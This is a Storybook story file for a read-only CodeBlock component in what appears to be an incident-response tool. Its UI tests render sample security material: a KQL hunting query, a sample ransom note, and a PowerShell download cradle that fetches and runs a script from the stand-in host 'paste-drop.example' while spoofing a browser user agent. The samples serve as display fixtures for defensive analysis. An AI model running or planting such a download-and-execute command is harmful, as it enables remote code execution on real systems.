import type { Meta, StoryObj } from '@storybook/react-vite'

import { expect } from 'storybook/test'

import { CodeBlock } from './code-block'

/**
 * A read-only block of code, a query or a log excerpt.
 */
const meta = {
  title: 'Components/CodeBlock',
  component: CodeBlock,
  parameters: { layout: 'padded' },
  args: { code: '' },
} satisfies Meta<typeof CodeBlock>

export default meta
type Story = StoryObj<typeof meta>

const frame = 'max-w-3xl'

/** The query behind a finding, as a Sentinel analyst writes it. */
export const Kql: Story = {
  play: async ({ canvas }) => {
    // The header carries the label where there is one and the language where
    // there is not, so a block is always identified by one or the other.
    await expect(canvas.getByText('Process creation on WKS-FINANCE01')).toBeVisible()

    // Numbered, because a query is discussed by line -- "the where on 3".
    await expect(canvas.getByText('6')).toBeVisible()

    // The code is a scrollable region, and one a keyboard can reach: a
    // scroller nothing can focus is unreadable past its own right edge to
    // anybody not using a pointer.
    const region = canvas.getByRole('region', { name: 'Process creation on WKS-FINANCE01' })
    await expect(region).toHaveAttribute('tabindex', '0')
  },
  args: {
    language: 'kql',
    label: 'Process creation on WKS-FINANCE01',
    lineNumbers: true,
    code: [
      'SecurityEvent',
      '| where TimeGenerated between (datetime(2026-08-05 08:00) .. datetime(2026-08-05 14:00))',
      '| where EventID == 4688 and Computer == "WKS-FINANCE01"',
      '| where CommandLine has_any ("-enc", "DownloadString", "IEX")',
      '| project TimeGenerated, Account, NewProcessName, CommandLine, ParentProcessName',
      '| order by TimeGenerated asc',
    ].join('\n'),
  },
  render: (args) => <CodeBlock {...args} className={frame} />,
}

/** What the actor ran, as it would sit on a timeline entry. */
export const PowerShell: Story = {
  args: {
    language: 'powershell',
    label: 'Timeline 08:41, first stage',
    code: [
      '$c = New-Object Net.WebClient',
      '$c.Headers.Add("User-Agent", "Mozilla/5.0")   # blends with browser traffic',
      '$p = $c.DownloadString("http://paste-drop.example/a")',
      'Invoke-Expression $p',
    ].join('\n'),
  },
  render: (args) => <CodeBlock {...args} className={frame} />,
}

/** How a piece of evidence was collected. */
export const Bash: Story = {
  args: {
    language: 'bash',
    label: 'Collection, DC-01',
    code: [
      '# Security event log, hashed before it leaves the host',
      'wevtutil epl Security /q:"*[System[(EventID=4688)]]" dc-01-security.evtx',
      'sha256sum dc-01-security.evtx | tee dc-01-security.evtx.sha256',
      'rsync -av dc-01-security.evtx* vault:/meridian/2026-031/',
    ].join('\n'),
  },
  render: (args) => <CodeBlock {...args} className={frame} />,
}

/** What an importer or an export actually carries. */
export const Json: Story = {
  args: {
    language: 'json',
    label: 'Consent grant, Graph response',
    code: [
      '{',
      '  "clientAppDisplayName": "Unknown Publisher LLC",',
      '  "principalDisplayName": "j.doe@acmecorp.com",',
      '  "consentType": "Principal",',
      '  "verifiedPublisher": null,',
      '  "scope": ["Mail.Read", "Mail.Send", "offline_access"],',
      '  "createdDateTime": "2026-08-05T08:44:12Z"',
      '}',
    ].join('\n'),
  },
  render: (args) => <CodeBlock {...args} className={frame} />,
}

/**
 * No grammar matches, so it renders as text and the header claims nothing.
 * This is the answer for the other nine tenths of what gets pasted.
 */
export const PlainText: Story = {
  play: async ({ canvas }) => {
    // No grammar matches, so the header claims none. A block asserting a
    // language it did not recognise would put a wrong label on the nine
    // tenths of what gets pasted into a case.
    await expect(canvas.getByText('Ransom note, FS-01')).toBeVisible()
    await expect(canvas.queryByText(/^(kql|bash|json|powershell)$/i)).toBeNull()

    // And the text is still the text, blank line and all.
    await expect(canvas.getByText(/ALL YOUR FILES ARE ENCRYPTED/)).toBeVisible()
  },
  args: {
    label: 'Ransom note, FS-01',
    code: [
      'ALL YOUR FILES ARE ENCRYPTED',
      '',
      'Contact us within 72 hours at meridian-recovery@onionmail.invalid',
      'Your key: 8f2c1d4e-9b7a-3f60-c5e8-d21b4a7f9c3e',
    ].join('\n'),
  },
  render: (args) => <CodeBlock {...args} className={frame} />,
}

/**
 * A query longer than any viewport.
 */
export const OneVeryLongLine: Story = {
  play: async ({ canvasElement }) => {
    // It scrolls inside the block rather than wrapping. A wrapped line
    // changes what somebody reads back as the query they ran, and the page
    // beside it must not move either -- a block that widened its own column
    // would push the pane it sits in.
    const scroller = canvasElement.querySelector('[data-slot="code-block-scroll"]')
    if (scroller === null) throw new Error('the block did not render')
    await expect(scroller.scrollWidth).toBeGreaterThan(scroller.clientWidth)

    const block = canvasElement.querySelector('[data-slot="code-block"]')!
    await expect(block.getBoundingClientRect().width).toBeLessThanOrEqual(
      canvasElement.getBoundingClientRect().width + 1,
    )
  },
  args: {
    language: 'kql',
    label: 'One line, unwrapped',
    code:
      'SecurityEvent | where TimeGenerated > ago(7d) | where EventID in (4624, 4625, 4648, 4672, 4688, 4697, 4720, 4728, 4732, 4756) ' +
      'and Computer in ("WKS-FINANCE01", "FS-01", "DC-01") | summarize Count = count(), First = min(TimeGenerated), Last = max(TimeGenerated) ' +
      'by Computer, Account, EventID | where Count > 3 | order by Last desc',
  },
  render: (args) => <CodeBlock {...args} className={frame} />,
}

/**
 * Nothing pasted, a bare line without a label, and the block without copy.
 */
export const Edges: Story = {
  render: () => (
    <div className={`flex flex-col gap-4 ${frame}`}>
      <CodeBlock code="" language="kql" label="No query saved" />
      <CodeBlock code="whoami /priv" language="bash" />
      <CodeBlock code="whoami /priv" language="bash" copy={false} label="No copy" />
    </div>
  ),
  play: async ({ canvas, canvasElement, step }) => {
    const blocks = [...canvasElement.querySelectorAll<HTMLElement>('[data-slot="code-block"]')]

    await step('The empty one is still a block, and still labelled', async () => {
      await expect(blocks).toHaveLength(3)
      await expect(canvas.getByText('No query saved')).toBeVisible()
      await expect(blocks[0]!.getBoundingClientRect().height).toBeGreaterThan(0)
    })

    await step('The bare one carries no label row', async () => {
      await expect(blocks[1]).toHaveTextContent('whoami /priv')
    })

    await step('And only the two that offer copy draw a button', async () => {
      await expect(blocks[2]!.querySelector('button')).toBeNull()
    })
  },
}
